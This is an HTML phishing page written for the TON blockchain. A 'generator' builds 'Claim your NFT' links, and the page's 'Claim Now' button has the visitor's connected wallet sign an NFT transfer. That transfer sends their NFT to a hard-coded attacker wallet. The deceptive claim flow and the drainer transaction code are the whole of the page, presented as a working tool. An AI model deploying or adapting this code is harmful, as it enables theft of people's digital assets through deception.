<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>NFT Claim</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@ton/core@0.51.0/dist/index.min.js"></script>
    <style>
        body { background: #111; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        input { width: 80%; max-width: 400px; padding: 15px; margin: 10px; border-radius: 8px; border: none; }
        button { padding: 15px 30px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 8px; font-size: 18px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="generator">
        <h1>NFT Generator</h1>
        <input type="text" id="nftInput" placeholder="Вставь ссылку на NFT...">
        <button onclick="generate()">Сгенерировать ссылку</button>
    </div>

    <div id="claim-box" class="hidden">
        <h1>Claim your NFT</h1>
        <div id="ton-connect"></div>
        <button id="claim-btn" style="background: #28a745; margin-top:20px;">Claim Now</button>
    </div>

    <script>
        const tonConnectUI = new TonConnectUI({ manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json' });
        const { beginCell, Address } = window['@ton/core'];

        function generate() {
            const url = document.getElementById('nftInput').value;
            const match = url.match(/(EQ|UQ)[a-zA-Z0-9_\-]{46}/g);
            if (match) {
                window.location.href = `/?nft=${match[match.length - 1]}`;
            } else {
                alert("Не найден адрес NFT!");
            }
        }

        const params = new URLSearchParams(window.location.search);
        const nftAddress = params.get('nft');

        if (nftAddress) {
            document.getElementById('generator').classList.add('hidden');
            document.getElementById('claim-box').classList.remove('hidden');
        }

        document.getElementById('claim-btn').onclick = async () => {
            const MY_WALLET = 'UQATIzX89EOOTqfsr8KE64MXvVSa4CGybjwmkPv3-yHbI3ZE';
            const body = beginCell()
                .storeUint(0x5fcc3d14, 32)
                .storeUint(0, 64)
                .storeAddress(Address.parse(MY_WALLET))
                .storeAddress(Address.parse(MY_WALLET))
                .storeBit(0)
                .storeCoins(0)
                .storeBit(0)
                .endCell();

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: nftAddress,
                    amount: '50000000',
                    payload: body.toBoc().toString('base64')
                }]
            };
            await tonConnectUI.sendTransaction(transaction);
        };
    </script>
</body>
</html>
